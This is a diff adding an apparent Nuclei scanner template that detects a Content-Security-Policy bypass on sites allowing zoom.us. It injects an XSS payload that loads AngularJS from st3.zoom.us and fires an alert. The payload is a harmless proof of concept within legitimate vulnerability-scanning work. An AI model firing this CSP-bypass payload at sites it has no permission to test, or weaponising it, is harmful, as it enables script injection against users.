@@ -1,0 +1,55 @@
+id: zoom-st3-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Zoom ST3
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,zoom-st3
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "zoom.us"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: zoom_st3_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app><input autofocus ng-focus="window=$event.target.ownerDocument.defaultView;window.alert(window.origin);">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "zoom_st3_csp_xss == true"
+# digest: 490a0046304402205d0382119356519aed4cfa34901df680456195bc41fe91ea230ae2b1e11c2f8e02207cc6c005c23b0b8e57b196dab09d276b710c5b0a04c06a1d9eae6d0c545ea22e:922c64590222798bb761d5b6d8e72950
